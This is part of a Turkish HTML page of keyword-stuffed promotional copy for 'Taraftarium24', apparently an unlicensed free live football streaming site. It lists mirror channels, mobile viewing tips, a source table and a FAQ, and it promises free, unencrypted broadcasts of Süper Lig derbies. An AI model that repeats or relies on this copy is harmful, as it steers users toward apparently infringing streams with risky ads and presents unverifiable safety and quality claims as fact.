+        Günümüzde futbolseverlerin büyük bölümü karşılaşmaları akıllı telefon ve tabletleri üzerinden takip etmektedir. Taraftarium24 mobil uyumlu HTML5 video oynatıcı altyapısı sayesinde hem iOS hem de Android cihazlarda ek bir eklentiye ihtiyaç duymadan canlı maç izle olanağı tanır. Mobil tarayıcınızdan sayfaya girdiğinizde maç listesi ekran boyutuna göre otomatik hizalanır ve tek dokunuşla tam ekran moduna geçiş yapılabilir.
+      </p>
+      <p>
+        Mobil cihazda maç izlerken görüntüde donma veya ses kayması yaşarsanız öncelikle arka planda veri tüketen diğer uygulamaları kapatmayı deneyin. Wi-Fi bağlantısında sinyal zayıflığı varsa 4.5G veya 5G mobil veri ağına geçmek, Selcuksports ve Justin TV tabanlı yayın akışlarının çok daha stabil yüklenmesine yardımcı olacaktır.
+      </p>
+
+      <h3>Mobil Maç Yayınları İzlerken Dikkat Edilmesi Gereken Güvenlik Noktaları</h3>
+      <p>
+        Telefon üzerinden ücretsiz canlı maç izle sitelerini ziyaret ederken karşınıza çıkan "Uygulamayı İndir" veya "Player Güncellemesi" şeklindeki bildirimlere karşı dikkatli olmalısınız. Taraftarium 24, Netspor, Kralbozguncu veya Golvar TV yayınlarını izlemek için cihazınıza herhangi bir APK dosyası kurmanız gerekmez; tüm yayınlar standart mobil internet tarayıcısı üzerinden doğrudan çalışır.
+      </p>
+      <p>
+        Sık kullandığınız Taraftarium24 yayın sayfasına maç saatlerinde vakit kaybetmeden ulaşmak için adresi mobil tarayıcınızın yer imlerine ekleyebilirsiniz. Alan adı güncellemeleri yaşandığında ise yer imini güncelleyerek Galatasaray maç izle, Fenerbahçe maç izle, Beşiktaş maç izle ve Amedspor maç izle yayınlarına saniyeler içinde erişebilirsiniz.
+      </p>
+
+      <h3>Donmadan Mobil Maç İzlemek İçin Kontrol Listesi</h3>
+      <ol>
+        <li>Telefonunuzun Wi-Fi veya mobil veri hızının canlı video akışı için yeterli olduğunu doğrulayın.</li>
+        <li>Güncel bir mobil tarayıcı (Chrome, Safari, Firefox veya Brave) kullandığınızdan emin olun.</li>
+        <li>Oynatıcıda takılma olursa Taraftarium24 altındaki alternatif Selçuksports veya Justin TV kanalını seçin.</li>
+        <li>Kaynağı belirsiz APK veya medya oynatıcı indirme taleplerini onaylamayın.</li>
+        <li>Görüntü kalitesi düşerse tarayıcı önbelleğini temizleyip yayın sayfasını yenileyin.</li>
+      </ol>
+    </section>
+
+    <section id="odeme">
+      <h2>Ücretsiz Canlı Maç İzle Kanalları ve Takım Bazlı Yayın Seçenekleri</h2>
+      <p>
+        Taraftarium24 bünyesinde sunulan yayınlar, farklı spor dallarını ve ligleri kapsayacak biçimde kategorize edilir. Türkiye'de en çok aranan Galatasaray maç izle (GS maç izle), Fenerbahçe maç izle (FB maç izle), Beşiktaş maç izle (BJK maç izle) ve Amedspor maç izle karşılaşmaları için maç saatinde birden fazla özel sunucu devreye alınır. Bu sayede yoğun derbi trafiğinde bile izleyiciler farklı yayın akışları arasında dağılarak takılma sorunu yaşamadan mücadeleyi takip edebilir.
+      </p>
+      <p>
+        Ana yayın akışına ek olarak platformda yer verilen Justin TV, Selcuksports (Selçuksports), Kralbozguncu, Netspor ve Golvar (Golvar TV) kanalları, farklı bitrate ve çözünürlük değerleriyle her internet hızına hitap eder. Kotalı veya düşük hızlı bağlantıya sahip kullanıcılar standart çözünürlüklü akışları seçebilirken, fiber internet kullanıcıları 1080p Full HD maç izle seçeneğiyle stadyum atmosferini ekranlarına taşıyabilir.
+      </p>
+
+      <h3>Taraftarium 24, Selçuksports ve Justin TV Yayınlarında Kalite ve Güvenlik</h3>
+      <p>
+        Ücretsiz canlı maç izle platformlarını kullanırken kişisel veri güvenliğini korumak oldukça basittir. İzleme sayfalarında herhangi bir kayıt veya ödeme adımı bulunmadığından, sizden kişisel bilgi ya da kart detayı isteyen açılır pencereleri derhal kapatmalısınız. Güvenli bir izleme deneyimi için yalnızca video oynatıcı kontrollerini (oynat, duraklat, ses ve tam ekran) kullanmanız yeterlidir.
+      </p>
+      <p>
+        Maç esnasında yaşanabilecek anlık yayın kesintilerinde sayfayı tamamen terk etmek yerine oynatıcı üstündeki "Kanal 1", "Kanal 2", "Selçuksports HD", "Justin TV" veya "Golvar TV" butonlarını denemek en pratik çözümdür. Böylece hem derbi heyecanından kopmaz hem de en düşük gecikme süresine sahip canlı yayını kolayca yakalayabilirsiniz.
+      </p>
+    </section>
+
+    <section id="yontem">
+      <h2>Canlı Maç Yayınları ve Güncel Adresler Hangi Kaynaklardan Takip Edilmeli?</h2>
+      <p>
+        Taraftarium24 güncel giriş adresini ve maç saatinde aktifleşen yayın linklerini bulmak için farklı dijital kanallardan yararlanabilirsiniz. Arama motoru sonuçları, spor forumları ve sosyal medya duyuruları en sık başvurulan yöntemler arasındadır. Aşağıdaki tabloda canlı maç izle bağlantılarını araştırırken kullanabileceğiniz başlıca yayın kaynakları ve dikkat etmeniz gereken teknik ayrıntılar yer almaktadır.
+      </p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>Yayın &amp; Bilgi Kaynağı</th>
+              <th>Sunduğu İçerik ve Avantajlar</th>
+              <th>Dikkat Edilmesi Gerekenler</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>Taraftarium24 Ana Oynatıcı</td>
+              <td>Süper Lig, Avrupa kupaları ve derbiler için doğrudan HD canlı maç izle akışı sunar.</td>
+              <td>Maç başlamadan 10 dakika önce sayfaya girerek aktif kanal sekmesini seçin.</td>
+            </tr>
+            <tr>
+              <td>Selçuksports &amp; Justin TV</td>
+              <td>GS maç izle, FB maç izle ve BJK maç izle yayınlarında yüksek kapasiteli yedek sunucu sağlar.</td>
+              <td>Yoğun saatlerde çözünürlük ayarını internet hızınıza göre optimize edin.</td>
+            </tr>
+            <tr>
+              <td>Golvar TV, Netspor &amp; Kralbozguncu</td>
+              <td>Amedspor maç izle dahil olmak üzere TFF 1. Lig ve uluslararası maçlar için alternatif linkler barındırır.</td>
+              <td>Oynatıcı üzerindeki yanıltıcı reklam katmanlarını kapatarak tam ekrana geçin.</td>
+            </tr>
+            <tr>
+              <td>Sosyal Medya ve Arama Motorları</td>
+              <td>Taraftarium 24 güncel adres değişikliklerini ve günlük maç programını hızlıca öğrenmenizi sağlar.</td>
+              <td>Yalnızca güncel tarihli duyuruları ve çalışan video oynatıcılı sayfaları tercih edin.</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3>Canlı Yayın Sırasında Donma ve Bağlantı Sorunları Nasıl Çözülür?</h3>
+      <p>
+        Canlı spor yayınlarında anlık takılmalar yaşanması durumunda sorunun kaynağını hızlıca tespit etmek seyir zevkini kurtarır. Eğer tüm kanallarda yavaşlama varsa modem bağlantınızı yenilemek veya tarayıcıda açık olan gereksiz sekmeleri kapatmak cihazınızın RAM ve bant genişliği performansını rahatlatacaktır.
+      </p>
+      <p>
+        Sorun yalnızca izlediğiniz kanala özgü ise Taraftarium24 oynatıcı panelindeki alternatif kaynaklara geçiş yapın. Örneğin ana yayında yoğunluk olduğunda Kralbozguncu, Netspor veya Golvar TV akışlarından birini seçmek, görüntünün saniyeler içinde tekrar akıcı hale gelmesini sağlar.
+      </p>
+    </section>
+
+    <section id="sss">
+      <h2>Taraftarium24 ve Canlı Maç İzleme Hakkında Sıkça Sorulan Sorular</h2>
+
+      <details>
+        <summary>Taraftarium24 güncel canlı maç izle adresi nasıl bulunur?</summary>
+        <p>
+          Taraftarium24 ve Taraftarium 24 yayınlarına ulaşırken arama motorlarındaki güncel duyuruları ve sayfa içindeki aktif maç listesini kontrol edebilirsiniz. Gerçek yayın sayfasında günün karşılaşmaları ve çalışan video oynatıcı alternatifleri doğrudan yer alır.
+        </p>
+      </details>
+
+      <details>
+        <summary>Canlı maç izlerken yayın donarsa hangi adımlar uygulanabilir?</summary>
+        <p>
+          Yayın donmaları çoğunlukla anlık izleyici yoğunluğundan veya internet dalgalanmalarından kaynaklanır. Oynatıcı altındaki Justin TV, Selçuksports, Kralbozguncu, Netspor veya Golvar TV alternatif kanallarına tıklayarak farklı bir sunucu üzerinden kesintisiz izlemeye devam edebilirsiniz.
+        </p>
+      </details>
+
+      <details>
+        <summary>Galatasaray, Fenerbahçe ve Beşiktaş derbileri şifresiz izlenebilir mi?</summary>
+        <p>
+          Evet, Taraftarium24 üzerinden Galatasaray maç izle (GS maç izle), Fenerbahçe maç izle (FB maç izle) ve Beşiktaş maç izle (BJK maç izle) yayınları maç saatinde çoklu sunucu desteğiyle ücretsiz ve şifresiz olarak sporseverlere sunulmaktadır.
+        </p>
+      </details>
+
+      <details>
+        <summary>Amedspor maç izle yayınları hangi kanallarda yer alıyor?</summary>
+        <p>
+          Amedspor maç izle karşılaşmaları, maç günlerinde Taraftarium24 günlük yayın akışı listesine eklenir. Karşılaşmayı ana oynatıcı üzerinden veya Selcuksports, Golvar TV ve Netspor alternatif kanallarından canlı takip edebilirsiniz.
+        </p>
+      </details>
+
+      <details>
+        <summary>Taraftarium 24 mobil maç izlemek için uygulama indirmek zorunlu mu?</summary>
+        <p>
+          Hayır, mobil cihazlardan canlı maç izle yayınlarına katılmak için herhangi bir uygulama veya APK dosyası indirmenize gerek yoktur. Telefonunuzun internet tarayıcısı üzerinden doğrudan yayınları HD kalitede izleyebilirsiniz.
+        </p>
+      </details>
+
+      <details>
+        <summary>Selçuksports, Justin TV ve Golvar TV yayınları arasındaki fark nedir?</summary>
+        <p>
+          Bu platformlar canlı maç yayınlarını farklı sunucu merkezleri ve bitrate değerleri üzerinden aktaran popüler yayıncılardır. Taraftarium24 bu kaynakları tek çatı altında toplayarak bir kanalda yoğunluk olduğunda diğerine anında geçiş yapabilmenizi sağlar.
+        </p>
+      </details>
+
+      <details>
+        <summary>Kralbozguncu ve Netspor alternatif kanalları nasıl açılır?</summary>
+        <p>
+          İzlemek istediğiniz karşılaşmanın üzerine tıkladığınızda video oynatıcının hemen üstünde veya altında kanal listesi belirir. Buradaki Kralbozguncu veya Netspor sekmesine dokunarak ilgili yayını aynı ekran içinde başlatabilirsiniz.
+        </p>
+      </details>
+
+      <details>
+        <summary>Ücretsiz maç izleme sitelerinde üyelik veya ücret talep edilir mi?</summary>
+        <p>
+          Taraftarium24 tamamen ücretsiz canlı maç izle hizmeti sunan bir rehber ve yayın platformudur. Maçları takip etmek için üyelik oluşturmanız veya herhangi bir ödeme bilgisi paylaşmanız gerekmez.
+        </p>
+      </details>
+    </section>
+  </main>
+
+  <footer class="site-footer">
+    <div class="footer-links">
+      <a href="#ligobet">Taraftarium24 Hakkında</a>
+      <a href="#giris">Canlı Maç İzle</a>
+      <a href="#mobil">Mobil Yayın</a>
+      <a href="#odeme">Yayın Kanalları</a>
+      <a href="#sss">Sık Sorulanlar</a>
+    </div>
+    <p class="footer-copy">
+      © 2026 Taraftarium24 Canlı Maç İzleme Merkezi. Ücretsiz spor yayınları bilgilendirme rehberi.
+    </p>
+  </footer>
+
+</body>
+</html>
